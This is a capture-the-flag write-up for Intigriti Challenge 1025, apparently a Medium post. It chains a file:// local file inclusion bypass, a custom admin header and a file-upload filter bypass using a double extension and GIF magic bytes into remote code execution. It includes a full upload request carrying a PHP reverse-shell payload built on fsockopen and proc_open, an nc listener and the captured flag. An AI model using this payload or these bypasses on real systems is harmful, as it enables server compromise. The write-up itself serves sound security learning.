# From SSRF to RCE

- **Source URL:** https://medium.com/@alejandro._./from-ssrf-to-rce-intigriti-challenge-1025-5a12d866db11?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@alejandro._.
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 11274)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
### intigriti/Challenge 1025

**Step 1: Initial Vulnerability Identification**

The first step was to navigate to the challenge URL:

To identify potential vulnerabilities, we can generate an error by passing the url parameter as an array:

The server responded with a descriptive error, giving us key insights into the backend:

`Fatal error: Uncaught TypeError: stripos(): Argument #1 ($haystack) must be of type string, array given in /var/www/html/challenge.php:85 Stack trace: #0 /var/www/html/challenge.php(85): stripos(Array, 'http') #1 {main} thrown in /var/www/html/challenge.php on line 85`
This error confirms the application is using PHP and that the stripos() function is checking our input for the string "http".

These errors are very useful because we can trigger mistakes the developer doesn’t expect and reveal information such as file paths, among other things.

**Step 2: LFI (Local File Inclusion) Exploitation**

Knowing that the string “http” is required, we can bypass the filter using the file:// wrapper and appending %23http. The hash symbol (#), URL-encoded as %23, is a URL fragment that the file system ignores, but the stripos() function will still find it.

Using this technique, we successfully read the /etc/hosts file:

The system returned the file’s contents, confirming the LFI vulnerability.

**Step 3: Directory Enumeration and File Discovery**

We used proc/self/cwd/ to list the files in the current working directory to understand the application’s structure:

[https://challenge-1025.intigriti.io/challenge.php?url=file:///proc/self/cwd/?p=http](https://challenge-1025.intigriti.io/challenge.php?url=file:///proc/self/cwd/?p=http)

This revealed the following files:

- uploads
- partials
- upload\_shoppix\_images.php
- index.php
- challenge.php
- public

The file upload\_shoppix\_images.php stood out. However, attempting to access it directly resulted in a **403 Forbidden** error.

To read its contents, we turned back to our LFI vulnerability:

The source code revealed a file upload functionality with MIME type and extension validation:

\<?php

if ($\_SERVER\['REQUEST\_METHOD'\] === 'POST') {

$file = $\_FILES\['image'\];

$filename = $file\['name'\];

$tmp = $file\['tmp\_name'\];

$mime = mime\_content\_type($tmp);

if (

strpos($mime, "image/") === 0 &&

(stripos($filename, ".png") !== false ||

stripos($filename, ".jpg") !== false ||

stripos($filename, ".jpeg") !== false)

) {

move\_uploaded\_file($tmp, "uploads/" . basename($filename));

echo "\<p style='color:#00e676'>✅ File uploaded successfully to /uploads/ directory!\</p>";

} else {

echo "\<p style='color:#ff5252'>❌ Invalid file format\</p>";

}

}

?>

**Step 4: Analyzing the Apache Configuration**

To understand the 403 error, we examined the Apache configuration file:

We discovered a custom access rule that required a specific HTTP header:

To access the upload endpoint, we needed to send the header Is-Shoppix-Admin: true.

**Step 5: Bypassing Filters and Executing a Reverse Shell**

The upload\_shoppix\_images.php script lacked robust security measures, allowing us to upload a shell. To bypass the filters, we did the following:

- **Filename Bypass:** We used a double extension like shell.png.php so that stripos() would find .png.
- **MIME Type Bypass:** We added the “magic bytes” of a GIF file (GIF89a) to the beginning of our PHP payload so mime\_content\_type() would identify it as an image.

The PHP configuration is checked using \<?php phpinfo()?>, which confirms that only five functions are disabled for the reverse shell. Therefore, we use proc\_open() fsockopen(), which is not disabled.

The final HTTP request to upload the shell was as follows (replace \<IP> and \<port> with your details):

POST /upload\_shoppix\_images.php HTTP/2

Host: challenge-1025.intigriti.io

Content-Length: 400

Cache-Control: max-age=0

Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Origin: https://challenge-1025.intigriti.io

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeoQrh8ga3LL9iFhd

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Is-Shoppix-Admin: true

Referer: https://challenge-1025.intigriti.io/upload\_shoppix\_images.php

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9,es;q=0.8

Priority: u=0, i

------WebKitFormBoundaryeoQrh8ga3LL9iFhd

Content-Disposition: form-data; name="image"; filename="oso12u7357998999.png.php"

Content-Type: image/gif

GIF89a

GIF89a\<?php

$ip = '\<IP>';

$port = \<port>;

$shell = '/bin/sh -i';

$sock = fsockopen($ip, $port);

$proc = proc\_open($shell, array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);

?>

------WebKitFormBoundaryeoQrh8ga3LL9iFhd--

**Step 6: Catching the Shell and Finding the Flag**

We set up a listener with nc to receive the connection:

nc -lvnp 8980

Next, we accessed our uploaded file to execute the payload:

Success! We received the reverse shell. With access to the system, all that was left was to find the flag.

$ cd /

$ /bin/ls

$ cat /93e892fe-c0af-44a1-9308-5a58548abd98.txt

INTIGRITI{ngks896sdjvsjnv6383utbgn}
